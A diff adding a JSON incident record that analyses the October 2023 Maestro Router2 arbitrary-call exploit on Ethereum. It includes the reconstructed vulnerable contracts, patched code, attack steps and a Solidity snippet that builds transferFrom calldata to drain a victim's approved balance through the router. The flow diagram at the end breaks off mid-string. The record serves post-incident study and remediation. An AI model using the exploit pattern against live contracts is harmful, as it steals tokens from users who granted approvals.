@@ -1,0 +1,40 @@
+{
+ "id": "2023__2023-10-24_Maestro_ArbitraryCall_ETH",
+ "source_file": "2023/2023-10-24_Maestro_ArbitraryCall_ETH.md",
+ "title": "Maestro Router2 — Arbitrary Call Vulnerability Analysis",
+ "date": "2023-10-24",
+ "protocol": "Maestro",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~280 ETH (approx. $485,000 ~ $668,000) · 106 addresses affected",
+ "loss_usd": 485000.0,
+ "root_cause": "Missing access control on function `0x9239127f` in the proxy pattern's logic contract — arbitrary token addresses and calldata could be passed to unauthorized steal tokens from users who had granted approvals",
+ "attack_tx": "0xc087...90d92 (14 ETH) and others",
+ "vulnerable_contract": "0x80a6...d5d9e (MaestroRouter2)",
+ "classes": [
+  "approval-abuse",
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable code — MaestroRouter2 proxy contract (0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e)\n\ncontract MaestroRouter2 {\n    address public logicContract; // Logic contract address (mutable)\n\n    // fallback: delegates all calls to the logic contract\n    fallback() external payable {\n        address impl = logicContract;\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            // ❌ Executes logic via delegatecall — preserves Router's context (msg.sender, storage)\n            // ❌ This means external calls in the logic contract use the Router's approve allowances\n            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 { revert(0, returndatasize()) }\n            default { return(0, returndatasize()) }\n        }\n    }\n}",
+  "// ❌ Vulnerable code — MaestroRouter2 Logic contract (0x8EAE9827b45bcC6570c4e82b9E4FE76692b2ff7a)\n// Source unverified — reconstructed from bytecode and transaction analysis\n\ncontract MaestroRouter2Logic {\n\n    // Selector: 0x9239127f\n    // Parameters: (address token, bytes calldata data, uint8 flag, bool someFlag)\n    function arbitraryCall(\n        address token,     // ❌ Arbitrary token/contract address — no validation\n        bytes calldata data, // ❌ Calldata to forward to external contract — no validation\n        uint8 flag,\n        bool someFlag\n    ) external {\n        // ❌ No validation of msg.sender (caller) — anyone can call\n        // ❌ No check that token address is in an allowed token list\n        // ❌ No blocking of dangerous function selectors in data (e.g., transferFrom)\n\n        // Executes within Router's context, so all of the Router's approve allowances are available\n        (bool success, ) = token.call(data);\n        require(success, \"Call failed\");\n    }\n}"
+ ],
+ "code_after": [
+  "// ✅ Patched code — access control + calldata validation added\n\ncontract MaestroRouter2Logic {\n\n    // ✅ Whitelist of allowed external router addresses (DEX routers only)\n    mapping(address => bool) public allowedTargets;\n\n    // ✅ Blocked function selector list (direct token transfers prohibited: transferFrom, transfer, etc.)\n    mapping(bytes4 => bool) public blockedSelectors;\n\n    // ✅ Block transferFrom, transfer, approve, etc. during initialization\n    constructor() {\n        blockedSelectors[bytes4(keccak256(\"transferFrom(address,address,uint256)\"))] = true;\n        blockedSelectors[bytes4(keccak256(\"transfer(address,uint256)\"))] = true;\n        blockedSelectors[bytes4(keccak256(\"approve(address,uint256)\"))] = true;\n    }\n\n    // Selector: 0x9239127f (patched version)\n    function arbitraryCall(\n        address target,\n        bytes calldata data,\n        uint8 flag,\n        bool someFlag\n    ) external {\n        // ✅ Verify caller is an authorized Maestro backend\n        require(isAuthorizedCaller(msg.sender), \"Unauthorized caller\");\n\n        // ✅ Verify target address is a whitelisted DEX router\n        require(allowedTargets[target], \"Target not whitelisted\");\n\n        // ✅ Verify the first 4 bytes of data (function selector) are not blocked\n        if (data.length >= 4) {\n            bytes4 selector = bytes4(data[:4]);\n            require(!blockedSelectors[selector], \"Selector blocked\");\n        }\n\n        (bool success, ) = target.call(data);\n        require(success, \"Call failed\");\n    }\n\n    function isAuthorizedCaller(address caller) internal view returns (bool) {\n        // ✅ Only allow authorized Maestro backend addresses\n        return authorizedCallers[caller];\n    }\n}",
+  "// ✅ Fix 1: Restrict function callers — allow only Maestro backend\nmodifier onlyAuthorizedBackend() {\n    require(\n        authorizedCallers[msg.sender],\n        \"MaestroRouter: Unauthorized caller\"\n    );\n    _;\n}\n\n// ✅ Fix 2: Allowed target whitelist (DEX routers only)\nmapping(address => bool) public allowedTargets;\n\n// ✅ Fix 3: Block dangerous function selectors\nmapping(bytes4 => bool) public blockedSelectors;\n\nfunction arbitraryCall(\n    address target,\n    bytes calldata data,\n    uint8 flag,\n    bool someFlag\n) external onlyAuthorizedBackend {\n    // ✅ Verify target is a whitelisted DEX router\n    require(allowedTargets[target], \"Target not in whitelist\");\n\n    // ✅ Verify the function selector in calldata is not on the danger list\n    if (data.length >= 4) {\n        bytes4 sel = bytes4(data[:4]);\n        require(!blockedSelectors[sel], \"Dangerous selector blocked\");\n    }\n\n    (bool success, ) = target.call(data);\n    require(success, \"External call failed\");\n}"
+ ],
+ "steps": [
+  "1. Query allowance/balance per victim",
+  "2. Call vulnerable function",
+  "fallback() → delegatecall(logicContract, calldata)",
+  "3. Execute arbitrary external call from logic contract",
+  "→ Mog.call(transferFromData)",
+  "4. Transfer victim tokens using Router's approve allowance",
+  "transferFrom(victim → attacker, balance)",
+  "5. Swap stolen Mog for WETH",
+  "6. Profit realized"
+ ],
+ "other_code": [
+  "bytes memory transferFromData = abi.encodeWithSignature(\n    \"transferFrom(address,address,uint256)\",\n    victim,      // Victim address (user who approved the Router)\n    attacker,    // Attacker address\n    balance      // Victim's full balance\n);\n\n// Call Router with function selector 0x9239127f\nbytes memory exploitData = abi.encodeWithSelector(\n    bytes4(0x9239127f),\n    address(MogToken),   // token: Mog token contract\n    transferFromData,    // data: transferFrom calldata\n    uint8(0),\n    false\n);\n(bool success,) = address(MaestroRouter2).call(exploitData);",
+  "┌─────────────────────────────────────────────────────────┐\n│  Attacker (0xce6397e53c13ff2903ffe8735e478d31e648a2c6)  │\n└───────────────────────┬─────────────────────────────────┘\n                        │\n                        │ 1. Query allowance/balance per victim\n                        ▼\n┌─────────────────────────────────────────────────────────┐\n│  Mog Token (0xaaeE1A9723aaDb7afA2810263653A34bA2C21C7a) │\n│  .allowance(victim, MaestroRouter2)                     │\n│  .balanceOf(victim)                                     │\n└───────────────────────┬─────────────────────────────────┘\n                        │\n                        │ 2. Call vulnerable function\n                        │    selector: 0x9239127f\n                        │    params: (Mog, transferFromData, 0, false)\n   "
+ ]
+}
